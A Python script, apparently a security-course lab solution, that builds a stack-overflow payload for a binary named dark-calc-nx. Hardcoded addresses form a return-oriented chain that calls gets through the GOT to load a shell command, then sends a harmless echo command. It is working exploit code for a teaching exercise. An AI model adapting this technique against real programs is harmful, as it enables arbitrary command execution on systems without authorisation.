#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"A" * 24
payload += 0x401a34.to_bytes(8,"little") #第一次ret用于对齐
payload += 0x401a2a.to_bytes(8,"little") #第二次，设置寄存器
payload += 0x0.to_bytes(8,"little") #rbx
payload += 0x1.to_bytes(8,"little") #rbp 要求rbx+1=rbp
payload += 0x602048.to_bytes(8,"little") #r12,+0 = gets@got.plt地址 call gets
payload += 0x602090.to_bytes(8,"little") #r13,command buf，=rdi
payload += 0x0.to_bytes(8,"little") #r14
payload += 0x0.to_bytes(8,"little") #r15
payload += 0x401a10.to_bytes(8,"little") #第三次，使用寄存器
payload += 0x0.to_bytes(8,"little") * 7 #ret前栈上7个占位值
payload += 0x40195c.to_bytes(8,"little")

sys.stdout.buffer.write(payload + b'\n')
sys.stdout.buffer.flush() 

sys.stdout.buffer.write(b'echo "Hope A will be your grade!"' + b'\n')
sys.stdout.buffer.flush() 